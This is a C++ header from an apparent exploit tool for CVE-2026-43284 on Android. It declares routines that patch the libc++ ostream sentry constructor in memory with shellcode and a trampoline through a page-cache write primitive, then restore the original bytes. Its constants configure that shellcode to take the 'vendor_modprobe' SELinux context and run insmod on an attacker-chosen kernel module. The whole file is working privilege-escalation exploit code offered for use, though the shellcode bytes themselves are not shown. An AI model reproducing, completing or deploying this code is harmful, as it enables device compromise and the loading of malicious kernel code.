#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_HOOK_PATCH_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_HOOK_PATCH_HPP

/* CVE-2026-43284 libc++ sentry hook application and unconditional restore.
 *
 * Independent rewrite of the upstream patch_hook()/restore_hook() pair in
 * third_party/dirtyfrag/usermode/ankit/exp.c:
 *   1. locate the hook site in the in-memory libc++.so (ELF .dynsym) with the
 *      B5-5 elf_hook locator and compute the shellcode/trampoline offsets with
 *      build_hook_plan();
 *   2. save the original shellcode region and the enclosing 16-byte trampoline
 *      block, then write the shellcode (padded, last word = jump back) and the
 *      branch-overwriting trampoline block through the injected page-cache
 *      write surface;
 *   3. restore both regions on every terminus path (success, failure, early
 *      exit) through restore_hook_patch().
 *
 * Upstream stores the displaced first instruction in a fixed .data slot
 * (libcxx_first_inst_copy); here the caller names the template slot that must
 * receive it via displaced_slot (kHookDisplacedNone to opt out).
 *
 * The module never opens a file, forks, allocates or writes a syscall: the
 * target image and the shellcode/restore buffers are caller-owned and every
 * block read/write goes through HookPatchIo. ADR-0004 R1: no pipeline/. */

#include "backend/cve_2026_43284/steps/elf_hook.hpp"
#include "backend/cve_2026_43284/steps/shellcode.hpp"

#include <cstddef>
#include <cstdint>
#include <string_view>

namespace ghostlock::backend::cve_2026_43284::steps {

    /* The upstream trampoline lives in exactly one 16-byte page-cache block. */
    inline constexpr std::size_t kHookTrampolineBytes = 16U;
    /* Sentinel for "do not bind the displaced instruction to a template slot". */
    inline constexpr std::size_t kHookDisplacedNone = static_cast<std::size_t>(-1);

    /* exp.c patch_hook target: the libc++ ostream sentry C1 constructor. */
    inline constexpr char kLibcxxSentrySymbol[] =
            "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_";
    /* The only hook library upstream patches. */
    inline constexpr char kLibcxxPath[] = "/system/lib64/libc++.so";

    /* Injected 16-byte read/write surface bound to the hook target (libc++.so).
     * The callbacks return 0/16 on success and non-zero/-errno on failure. */
    struct HookPatchIo final {
        void *ctx = nullptr;
        std::int32_t (*write16)(void *ctx, std::uint64_t offset,
                                const void *bytes16) noexcept = nullptr;
        long (*read16)(void *ctx, std::uint64_t offset,
                       std::uint8_t out[16]) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept {
            return write16 != nullptr && read16 != nullptr;
        }
    };

    /* Everything needed to apply and later restore the patch. The shellcode and
     * shell_orig buffers are caller-owned and must outlive the plan; they are
     * not freed or copied. */
    struct HookPatchPlan final {
        bool valid = false;
        HookPlan hook{};
        const std::uint8_t *shellcode = nullptr; /* padded new bytes */
        std::size_t shellcode_size = 0U;         /* aligned to 16 */
        const std::uint8_t *shellcode_orig = nullptr; /* saved original */
        std::uint64_t trampoline_offset = 0U;    /* 16-aligned block */
        std::size_t trampoline_pos = 0U;         /* branch offset inside block */
        std::uint8_t trampoline_orig[kHookTrampolineBytes]{};
        std::uint8_t trampoline_new[kHookTrampolineBytes]{};
    };

    enum class HookPatchError : std::uint8_t {
        None = 0,
        NullImage,
        ImageTooSmall,
        TargetNotFound,
        GuardRejected,
        ShellcodeBuildFailed,
        ShellcodeBufferTooSmall,
        PlanFailed,
        IoUnavailable,
        ReadFailed,
        WriteFailed,
        InvalidPlan,
        NotApplied,
    };

    /* Locates the symbol, builds the parameterized shellcode and the
     * trampoline, and reads back the two original regions. shellcode_cap must
     * be at least the padded template size (kShellcodeMaxBytes covers it); the
     * saved-original buffer must be at least as large as the padded shellcode.
     * On success out.shellcode points into shellcode_buf and
     * out.shellcode_orig into shellcode_orig_buf. */
    [[nodiscard]] bool plan_hook_patch(const std::uint8_t *image,
                                       std::size_t image_size,
                                       std::string_view symbol,
                                       HookGuardPolicy guard,
                                       const ShellcodeTemplate &tmpl,
                                       const ShellcodeBinding *bindings,
                                       std::size_t binding_count,
                                       std::size_t displaced_slot,
                                       std::uint8_t *shellcode_buf,
                                       std::size_t shellcode_cap,
                                       std::uint8_t *shellcode_orig_buf,
                                       const HookPatchIo &io, HookPatchPlan &out,
                                       HookPatchError &error) noexcept;

    /* Writes the shellcode blocks, then the trampoline block (upstream order
     * exp.c:716-741). */
    [[nodiscard]] bool apply_hook_patch(const HookPatchPlan &plan,
                                        const HookPatchIo &io,
                                        HookPatchError &error) noexcept;

    /* Writes the saved trampoline block, then the saved shellcode region
     * (upstream order exp.c:745-753). Safe to call when plan.valid is false:
     * it reports NotApplied without touching the surface. */
    [[nodiscard]] bool restore_hook_patch(const HookPatchPlan &plan,
                                          const HookPatchIo &io,
                                          HookPatchError &error) noexcept;

    /* ---- upstream libcxx.S parameterization (B5-9e) ---- */

    /* Layout of the embedded blob (embed/libcxx_blob.hpp), taken from the
     * assembled symbol table; libcxx_data is offset 0. The blob stores its
     * strings first, so the executable entry is libcxx_start - libcxx_data and
     * the upstream jump-back word is the raw blob's last word. */
    inline constexpr std::size_t kLibcxxEntryOffset = 0x90U;      /* libcxx_start */
    inline constexpr std::size_t kLibcxxJumpBackOffset = 0x1D4U;  /* b end */
    inline constexpr std::size_t kLibcxxDisplacedOffset = 0x1D0U; /* inst copy */
    inline constexpr std::size_t kLibcxxSlotCount = 7U;
    inline constexpr std::size_t kLibcxxValueSlotCount = 6U;
    inline constexpr std::size_t kLibcxxSlotMutex = 0U;
    inline constexpr std::size_t kLibcxxSlotSelinuxContext = 1U;
    inline constexpr std::size_t kLibcxxSlotSelinuxLength = 2U;
    inline constexpr std::size_t kLibcxxSlotAttrExec = 3U;
    inline constexpr std::size_t kLibcxxSlotInsmod = 4U;
    inline constexpr std::size_t kLibcxxSlotCarrier = 5U;
    inline constexpr std::size_t kLibcxxSlotDisplaced = 6U;

    /* Upstream libcxx.S defaults. */
    inline constexpr char kLibcxxSelinuxContext[] = "u:r:vendor_modprobe:s0";
    inline constexpr char kLibcxxInsmodPath[] = "/vendor/bin/insmod";
    inline constexpr char kLibcxxMutexPath[] = "/dev/df";
    inline constexpr char kLibcxxAttrExecPath[] = "/proc/self/attr/exec";
    /* The upstream ko_target buffer is 64 bytes including the NUL. */
    inline constexpr std::size_t kLibcxxCarrierMaxBytes = 64U;

    struct LibcxxHookBindings final {
        std::string_view carrier_path{};
        std::string_view selinux_context = std::string_view(kLibcxxSelinuxContext);
        std::string_view insmod_path = std::string_view(kLibcxxInsmodPath);
        std::string_view mutex_path = std::string_view(kLibcxxMutexPath);
        std::string_view attr_exec_path = std::string_view(kLibcxxAttrExecPath);
    };

    /* The embedded libcxx.S template: entry 0x90, explicit jump-back offset
     * 0x1D4, and the seven slots above. */
    [[nodiscard]] ShellcodeTemplate libcxx_shellcode_template() noexcept;

    /* Fills the kLibcxxValueSlotCount value slots from bindings (the displaced
     * instruction slot is added by plan_hook_patch). Fails closed when a path
     * is empty or does not fit its upstream buffer, or when the SELinux context
     * string (plus its NUL, which upstream writes) cannot be encoded. */
    [[nodiscard]] bool make_libcxx_hook_bindings(
            const LibcxxHookBindings &bindings,
            ShellcodeBinding out[kLibcxxValueSlotCount], std::size_t &out_count,
            ShellcodeError &error) noexcept;

} // namespace ghostlock::backend::cve_2026_43284::steps

#endif
